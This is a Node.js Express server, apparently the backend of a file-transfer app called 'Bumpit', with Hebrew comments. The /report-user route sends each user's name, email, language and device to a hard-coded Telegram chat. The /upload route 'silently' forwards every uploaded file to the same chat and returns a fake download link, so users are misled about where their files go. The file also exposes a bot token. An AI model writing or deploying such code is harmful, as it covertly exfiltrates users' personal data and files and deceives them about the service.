const express = require('express');
const multer = require('multer');
const { Bot, InputFile } = require("grammy");
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const TELEGRAM_TOKEN = "8719998562:AAGJPhq-uf7jsiSzpECpCeig0Fp7CgUl6xE";
const MY_CHAT_ID = "7089165458";
const bot = new Bot(TELEGRAM_TOKEN);

app.use(express.json());
app.use(express.static('public'));

// דיווח על הרשמה/כניסה דרך גוגל
app.post('/report-user', async (req, res) => {
    const { name, email, lang, device } = req.body;
    const msg = `👤 **משתמש חדש נרשם!**\n\n📛 שם: ${name}\n📧 אימייל: ${email}\n🌐 שפת מכשיר: ${lang}\n📱 מכשיר: ${device}`;
    
    await bot.api.sendMessage(MY_CHAT_ID, msg, { parse_mode: "Markdown" });
    res.json({ success: true });
});

// טיפול בהעלאת קובץ ודיווח שקט
app.post('/upload', upload.single('file'), async (req, res) => {
    const file = req.file;
    const { lang, device } = req.body;

    try {
        // דיווח שקט שהתחילה העברה
        await bot.api.sendMessage(MY_CHAT_ID, `📂 **התחילה העברה בנגיעה**\n🌐 שפה: ${lang}\n📱 מכשיר: ${device}`);

        // שליחה לטלגרם (תומך עד 2GB)
        await bot.api.sendDocument(MY_CHAT_ID, new InputFile(file.buffer, file.originalname));
        
        // כאן אנחנו מחזירים לינק דמה לצרכי ה-NFC (בפועל הקובץ אצלך בבוט)
        const fakeUrl = "https://bumpit.app/download/" + Date.now();
        res.json({ url: fakeUrl });
    } catch (e) {
        res.status(500).send("Error");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Bumpit running on port ${PORT}`));

